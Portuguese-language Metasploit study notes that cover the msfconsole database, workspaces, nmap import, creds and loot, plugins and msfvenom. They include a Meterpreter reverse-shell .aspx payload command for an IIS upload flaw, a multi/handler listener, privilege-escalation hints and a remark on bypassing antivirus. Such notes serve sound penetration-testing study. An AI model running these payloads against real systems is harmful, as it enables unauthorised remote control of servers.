## Base de dados

msfconsole possui uma base de dados nativa integrada 

### inicializando à base de dados:

	sudo systemctl status postgresql
	sudo systemctl start postgresql
	
	sudo msfdb init
	sudo msfdb status

### conectando à base de dados:

	msf6 > sudo msfdb run

### utilizando workspaces:

workspaces são similares a pastas num sistema operacional, é possível armazenar resultados de scans, hosts e informações extraídas por ip/subnet/network/domínio

	msf6 > workspace
	msf6 > workspace -a[dd] [workspace-name]
	msf6 > workspace -d[elete] [workspace-name]

### importando arquivos para dentro de um workspace:

o output de um scan de host do **nmap** pode ser importado (preferencialmente em .xml) para dentro de um workspace

	msf6 > db import Target.xml

### utilizando um scan nmap diretamente do msfconsole:

	msf6 > db_nmap -sV -sS [target-i]

### exportando arquivos da base de dados:

	msf6 > db_export -h
	msf6 > db_export -f xml [backup-name]

### tabelas da base de dados:

#### hosts:

a tabela hosts é automaticamente populada com endereços, hostnames e outras informações advindas de scans (hosts customizados também podem ser adicionados manualmente)

	msf6 > hosts -h

#### services:

tabela que contém descrições e informações sobre serviços descobertos durante scans

	msf6 > services -h 

#### creds:

esse comando permite visualizar credenciais coletadas durante as interações com o alvo, também é possível adicionar credenciais manualmente, associar credenciais com portas, adicionar descrições etc.

	msf6 > creds -h

### loot:

funciona em conjunto com o comando creds e permite observer uma lista de user e serviços ownados

	msf6 > loot -h

## Plugins e Módulos

plugins são extensões criadas pela comunidade e aprovada pelos criadores para integração no framework, eles adicionam diversas funcionalidades ao metasploit

a vantagem de utilizar plugins é que os resultados são automaticamente registrados na base de dados, além de permitir a automação de tarefas repetitivas

para instalar um plugin é necessário colocar o arquivo **.rb** na pasta /usr/share/metasploit-framework/plugins

para carregar um plugin:

	msf6 > load [plugin-name] 


é possível adicionar módulos ao metasploit, no site exploitdb é possível pesquisar pela tag MSF para visualizar apenas exploit que possuem o formato necessário para serem importados no framework

após o download é necessário colocar o módulo na pasta (/usr/share/metasploit-framweork/modules/[pasta-apropriada]) e depois recarregar os módulos

	msf6 > reload_all

## MSFVenom

o comando msfvenom pode ser usado para gerar payloads, possui muitas opções de customização de parâmetros, encoding e formatos que podem ser usados para das bypass em proteções como antivírus 


exemplo de reverse shell usando um payload .aspx numa aplicação IIS + FTP vulnerável a upload de arquivos

	msfvenom -p[ayload] /windows/meterpreter/reverse_tcp LHOST=[ip-local] LPORT=[porta-local] -f[ormat] aspx > [nome-do-arquivo].aspx

	msfconsole -q
	msf6 > use multi/handler
	msf6 > set LHOST [ip-local]
	msf6 > set LPORT [porta-local]

acessando o alvo e requisitando o recurso em http://[ip-alvo]/[nome-do-arquivo].aspx então criaria uma conexão do alvo para a máquina atacante

	meterpreter > getuid
>Server username: IIS APPPOOL\\Web

### Local Exploit Suggester

esse exploit pode ser usado para a escalação de privilégios, visto que, por exemplo, o usuário **IIS APPPOOL\\Web** geralmente não possui muitas permissões no sistema

após ser executado ele retornará uma lista de possíveis exploits a serem usados para conseguir acesso administrativo 



## Evasão de IDS/IPS e Firewall

